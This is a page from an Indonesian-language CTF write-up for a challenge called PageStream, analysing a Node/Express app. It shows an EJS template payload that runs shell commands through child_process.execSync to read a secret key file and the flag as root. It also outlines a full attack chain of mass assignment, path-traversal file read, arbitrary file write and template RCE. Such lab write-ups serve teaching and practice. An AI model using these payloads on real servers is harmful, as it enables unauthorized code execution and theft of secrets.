# PageStream — Analisis

[← Overview](51-pagestream.md) · [Index](index.md)

> **Langkah 6/11 — Analisis.** EJS dirender oleh Express:
>
> **Titik penting:** EJS dirender oleh Express:
>
> **Berikutnya:** [Eksploitasi / Solver](51-pagestream-07-eksploitasi-solver.md)

## 2.4 RCE via overwrite EJS view

EJS dirender oleh Express:

```js
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
```

`NODE_ENV` tidak diset, sehingga view cache Express nonaktif; template dibaca ulang tiap request. Menimpa `views/dashboard.ejs` dengan payload EJS:

```ejs
<%= global.process.mainModule.require('child_process')
    .execSync('id; echo ---KEY---; cat /etc/pagestream.key; echo ---FLAG---; '
            + '/readflag $(cat /etc/pagestream.key)').toString() %>
```

lalu `GET /dashboard` mengeksekusi perintah sebagai root.

## 2.5 Rantai penuh

```text
register user
  -> POST /profile role=admin          (mass assignment)
  -> GET /view?file=../../root/flag.txt (LFI, flag langsung)
     atau
  -> POST /post/new filename=../views/dashboard.ejs (arbitrary write)
  -> GET /dashboard                    (EJS RCE root)
  -> /readflag $(cat /etc/pagestream.key)
```

### Evidence langkah ini

![term-02-exploit-run.png](assets/pagestream/term-02-exploit-run.png)

*Terminal evidence — `02-exploit-run.txt` (arsip transkrip sesi solve).*

![term-source-notes.png](assets/pagestream/term-source-notes.png)

*Terminal evidence — `source-notes.txt` (arsip transkrip sesi solve).*

**Berkas mentah langkah ini:**

- [`02-exploit-run.txt`](assets/pagestream/02-exploit-run.txt)
- [`source-notes.txt`](assets/pagestream/source-notes.txt)
